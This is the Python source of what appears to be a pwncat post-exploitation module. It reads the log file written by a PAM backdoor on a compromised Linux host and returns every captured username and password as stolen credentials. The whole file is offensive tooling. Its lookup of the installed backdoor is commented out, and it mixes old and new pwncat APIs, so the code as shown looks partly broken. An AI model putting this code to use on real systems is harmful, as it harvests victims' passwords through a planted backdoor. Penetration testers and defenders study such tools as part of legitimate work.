#!/usr/bin/env python3

import pwncat
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import EnumerateModule, Schedule
from pwncat.modules.enumerate.creds import PasswordData
from pwncat.modules.persist.gather import InstalledModule


class Module(EnumerateModule):
    """
    Exfiltrate logged passwords from the pam-based persistence
    module. This persistence module logs all attempted passwords
    for all users in a known location. We read this file and yield
    all passwords we have collected.
    """

    PLATFORM = [Linux]
    SCHEDULE = Schedule.ALWAYS
    PROVIDES = ["creds.password"]

    def enumerate(self, session):

        pam: InstalledModule = None
        # for module in session.run(
        #     "persist.gather", progress=self.progress, module="persist.pam_backdoor"
        # ):
        #     pam = module
        #     break

        if pam is None:
            # The pam persistence module isn't installed.
            return

        # Grab the log path
        log_path = pam.persist.args["log"]
        # Just in case we have multiple of the same password logged
        observed = []

        # This ensures our user database is fetched prior to opening the file.
        # otherwise, we may attempt to read the user database while the file is
        # open
        session.platform.current_user()

        try:
            with session.platform.open(log_path, "r") as filp:
                for line in filp:
                    line = line.rstrip("\n")
                    if line in observed:
                        continue

                    user, *password = line.split(":")
                    password = ":".join(password)

                    try:
                        # Check for valid user name
                        session.platform.find_user(name=user)
                    except KeyError:
                        continue

                    observed.append(line)

                    yield "creds.password", PasswordData(
                        password, log_path, None, uid=pwncat.victim.users[user].id
                    )
        except (FileNotFoundError, PermissionError):
            pass
